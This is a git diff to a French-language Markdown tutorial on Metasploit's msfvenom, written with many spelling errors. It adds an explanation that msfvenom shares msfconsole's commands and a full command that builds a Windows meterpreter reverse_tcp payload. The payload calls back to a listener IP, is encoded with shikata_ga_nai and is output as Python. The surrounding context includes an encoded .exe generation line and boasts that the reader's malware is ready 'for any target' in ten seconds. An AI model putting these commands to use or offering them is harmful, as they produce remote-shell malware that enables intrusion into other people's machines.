@@ -205,6 +205,7 @@ generate -e x86/shikata_ga_nai -b \xff -i 2 -o /home/kali/Desktop/fichier.exe -f
 ## explication :
 
 msfvemon est comme msfconsol ,nous avons pu voir seulement le module playload et encoder mais il en exisit 6 alors que msfvemon est concentrer que sur les playload et encoder on peut penser c bien mais oublier les menu chouette avec plein de chois les commande show encoder et option il n y a que deux commande pour vous aider  comme sur l image 
+sinon msfvenom se base sur les meme commande que msfconsol
 
 ## tout d abord la commande pour avoir les option et parametre qui vont accompagner votre playload :
 
@@ -224,3 +225,11 @@ msfvenom -lall
 ````
 
 ### apres si vous connaissait bien les commande en 10 seconde votre malwar est fait pour n import quel cible , c est la puissance de msfvenom
+
+
+exemple(remplacer votre ip) :
+
+````bash
+msfvenom
+-p windows/meterpreter/reverse_tcp lhost=10.10.4.4 lport=4444 -e x86/shikata_ga_nai -b "\x00" -f python
+````
